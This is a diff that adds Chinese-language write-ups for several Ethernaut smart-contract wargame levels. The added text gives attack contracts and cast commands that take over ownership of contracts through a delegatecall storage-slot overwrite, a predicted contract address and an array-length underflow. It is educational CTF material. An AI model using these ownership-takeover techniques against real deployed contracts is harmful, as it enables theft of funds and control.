@@ -272,3 +272,119 @@ cast call "" "balanceOf(address)" ""
 cast send "" "function approve(address, uint256)" "" 0xd3c21bcecceda1000000 
 cast send "" "transferFrom(address,address,uint256)" "" "" 0xd3c21bcecceda1000000
 ```
+## Preservation
+
+前面已经说过了delegatecall的问题，那么这题就很明显了
+
+题目使用的LibraryContract固定修改slot 0的内容。于是可以用setSecondTime将timeZone1Library的address覆盖成任意地址。这里我们覆盖成自己写的“LibraryContract”，但其setTime修改的是slot 2的内容，对应instance中owner的slot
+```solidity
+contract LibraryContract {
+    uint256 storedTime1;
+    uint256 storedTime2;
+    uint256 storedTime;
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+contract Attack {
+    Preservation target=Preservation(address());
+    function exploit() public {
+        LibraryContract libraryContract = new LibraryContract();
+        target.setSecondTime(uint256(uint160(address(libraryContract))));
+        target.setFirstTime(uint256(uint160()));
+    }
+}
+```
+## Recovery
+
+可以预测/计算solidity里创建的合约地址：`keccak256(address, nonce)`。其中address是创建合约的合约的地址（或发起转账的公钥地址ethereum address）；nonce是已创建的合约数量+1（或transaction nonce）
+
+foundry自带`computeCreateAddress`函数计算地址，在script的run函数里才能调用
+```solidity
+contract AttackScript is Script {
+    function run() public {
+        vm.startBroadcast();
+        SimpleToken(payable(vm.computeCreateAddress(address(),1))).destroy(payable(address()));
+        vm.stopBroadcast();
+    }
+}
+```
+## MagicNumber
+
+目标是用evm raw bytecode编写一个大小不超过10字节的合约；在调用合约的`whatIsTheMeaningOfLife`函数时返回42。这活AI最会了
+
+最终bytecode为`602a60005260206000f3`：
+```
+60 2a — PUSH1 0x2a（把数字 42 压栈）
+
+60 00 — PUSH1 0x00（压入MSTORE的参数0）
+
+52 — MSTORE（在内存 offset 0 存入 32 字节的值 42）
+
+60 20 — PUSH1 0x20（return bytecode的参数32）
+
+60 00 — PUSH1 0x00（return bytecode的参数“内存偏移0”）
+
+f3 — RETURN（返回内存 [0,32] —— 即 32 字节的 42）
+```
+一般的合约都有函数选择器，用于决定调用方调用的是什么函数。上述bytecode没有这段逻辑，因此并不是只有在调用`whatIsTheMeaningOfLife`时才返回42，无论调用什么都会返回42
+
+至于为什么一定要把42存进内存里再返回，因为return指令只能返回内存区域的数据。也不能直接返回字节常量42（仅1字节），因为题目指定了返回值的类型为32字节（uint256）
+
+```sh
+cast send --create 600a600c600039600a6000f3602a60005260206000f3
+```
+注意`--create`指的是creation code，实际部署在链上的合约是creation code返回的内容。所以以上bytecode是返回`602a60005260206000f3`的bytecode
+
+拿到transaction hash后在 https://sepolia.etherscan.io 可以看到创建的合约的地址
+
+https://ethervm.io/decompile 可以用来确认编写的bytecode是否正确
+
+## Alien Codex
+
+动态数组在storage slot里的布局非常抽象。其“本体”只有一个长度字段，存储规则和先前说的一样，按顺序占用slot位。但是其数据部分起始于第`keccak256(abi.encode(1))`个slot（称为arrayStart），即数组索引i对应的数据存储在第`arrayStart + i`个slot
+
+EVM共有 $2^{256}$ 个slot，如果超出这个数就会发生溢出，重新从0开始算起
+
+假设合约B继承自合约A，slot占用的顺序是从A到B（先父合约再子合约）。从某个古老的[commit](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/be5ed7364b93daccbb74a09e3f5ec1be6c458097/contracts/ownership/Ownable.sol)中找到0.5.0版本的`Ownable.sol`后可以像这样查看AlienCodex的storage（假设文件在src下）：
+```sh
+forge inspect AlienCodex storage-layout
+```
+结果如下：
+```
+╭---------+-----------+------+--------+-------+-------------------------------╮
+| Name    | Type      | Slot | Offset | Bytes | Contract                      |
++=============================================================================+
+| _owner  | address   | 0    | 0      | 20    | src/AlienCodex.sol:AlienCodex |
+|---------+-----------+------+--------+-------+-------------------------------|
+| contact | bool      | 0    | 20     | 1     | src/AlienCodex.sol:AlienCodex |
+|---------+-----------+------+--------+-------+-------------------------------|
+| codex   | bytes32[] | 1    | 0      | 32    | src/AlienCodex.sol:AlienCodex |
+╰---------+-----------+------+--------+-------+-------------------------------╯
+```
+目标`_owner`确实是第0个slot
+
+利用上述溢出问题即可覆盖`_owner`
+
+首先绕过modifer：
+```sh
+cast send "" "makeContact()"
+```
+然后调用retract函数使合约的长度-1：从0变成 $2^{256}-1$
+
+```sh
+cast send "" "retract()"
+```
+因为上一步我们将数组的长度变得足够大，所以revise函数能够写整个storage。计算从arrayStart到溢出需要的索引：
+```sh
+#必须有这么多0，不然结果不正确
+cast keccak 0x0000000000000000000000000000000000000000000000000000000000000001
+```
+```py
+print(2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
+```
+最后覆盖slot 0
+```sh
+cast send "" "revise(uint256, bytes32)" 35707666377435648211887908874984608119992236509074197713628505308453184860938 ""
+```
+本来想写攻击合约的，结果`forge-std`不支持0.5.0这么古老的版本，只能用foundry命令行了
